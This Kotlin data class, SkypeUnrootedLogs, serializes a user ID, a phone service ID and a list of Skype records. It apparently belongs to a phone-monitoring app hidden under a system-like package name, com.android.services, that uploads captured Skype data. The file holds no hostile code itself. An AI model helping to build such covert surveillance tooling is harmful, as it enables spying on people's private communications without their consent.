package com.android.services.models

import com.android.services.db.entities.SkypeUnrooted
import com.google.gson.annotations.SerializedName

class SkypeUnrootedLogs {
    @SerializedName("userId")
    var userId:String?=null
    @SerializedName("phoneServiceId")
    var phoneServiceId:String?=null
    @SerializedName("data")
    var skypeUnrootedList:List<SkypeUnrooted>?=null
    constructor(
        userId:String?,
        phoneServiceId:String?,
        skypeUnrootedList: List<SkypeUnrooted>
    ){
        this.userId=userId;
        this.phoneServiceId=phoneServiceId
        this.skypeUnrootedList=skypeUnrootedList
    }

}